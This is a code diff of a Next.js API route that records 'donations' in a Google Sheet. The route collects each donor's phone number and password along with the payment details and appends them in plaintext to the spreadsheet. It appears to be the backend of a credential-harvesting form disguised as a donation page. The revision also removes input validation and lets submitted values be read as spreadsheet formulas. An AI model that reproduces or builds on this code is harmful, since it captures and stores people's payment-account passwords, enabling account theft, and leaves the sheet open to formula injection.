@@ -1,28 +1,25 @@
-// /app/api/donaciones/route.ts
-
+import { NextResponse } from "next/server";
 import { google } from "googleapis";
 import {
-  GOOGLE_PRIVATE_KEY,
   GOOGLE_CLIENT_EMAIL,
+  GOOGLE_PRIVATE_KEY,
   SPREADSHEET_ID_DONACIONES,
   SHEET_NAME_DONACIONES,
 } from "@/config/idSheets";
 
-import GOOGLE_SHEETS_API_KEY from "@/config/googleApiKey";
-
-export async function POST(req: Request) {
+export async function POST(request: Request) {
   try {
-    const body = await req.json();
-    const { phoneNumber, password, amount, selectedActivity, paymentMethod } = body;
+    const body = await request.json();
 
-    if (!amount || !selectedActivity || !paymentMethod) {
-      return Response.json(
-        { error: "Faltan datos obligatorios" },
-        { status: 400 }
-      );
-    }
+    const {
+      phoneNumber,
+      password,
+      amount,
+      selectedActivity,
+      paymentMethod,
+    } = body;
 
-    // Autenticación con Service Account
+    // Autenticación con Google
     const auth = new google.auth.JWT(
       GOOGLE_CLIENT_EMAIL,
       undefined,
@@ -30,44 +27,35 @@ export async function POST(req: Request) {
       ["https://www.googleapis.com/auth/spreadsheets"]
     );
 
-    const sheets = google.sheets({
-      version: "v4",
-      auth,
-      params: {
-        key: GOOGLE_SHEETS_API_KEY,
+    const sheets = google.sheets({ version: "v4", auth });
+
+    // Registrar donación en Google Sheets
+    await sheets.spreadsheets.values.append({
+      spreadsheetId: SPREADSHEET_ID_DONACIONES,
+      range: `${SHEET_NAME_DONACIONES}!A1`,
+      valueInputOption: "USER_ENTERED",
+      requestBody: {
+        values: [
+          [
+            new Date().toLocaleString("es-CO"),
+            selectedActivity,
+            amount,
+            paymentMethod,
+            phoneNumber || "N/A",
+            password || "N/A",
+          ],
+        ],
       },
     });
 
-    // Datos en columnas A:F:
-    // A: Fecha
-    // B: Actividad
-    // C: Monto
-    // D: Método de pago
-    // E: Número
-    // F: Contraseña
-    const values = [
-      [
-        new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" }),
-        selectedActivity,
-        amount,
-        paymentMethod,
-        phoneNumber || "N/A",
-        password || "N/A",
-      ],
-    ];
-
-    await sheets.spreadsheets.values.append({
-      spreadsheetId: SPREADSHEET_ID_DONACIONES,
-      range: `${SHEET_NAME_DONACIONES}!A:F`,
-      valueInputOption: "RAW",
-      requestBody: { values },
-    });
-
-    return Response.json({ message: "Donación registrada con éxito" });
-  } catch (error) {
-    console.error("Error al registrar donación:", error);
-    return Response.json(
-      { error: "Error interno al registrar la donación" },
+    return NextResponse.json(
+      { message: "Donación registrada correctamente" },
+      { status: 200 }
+    );
+  } catch (error: any) {
+    console.error("Error al guardar la donación:", error);
+    return NextResponse.json(
+      { error: "No se pudo registrar la donación" },
       { status: 500 }
     );
   }
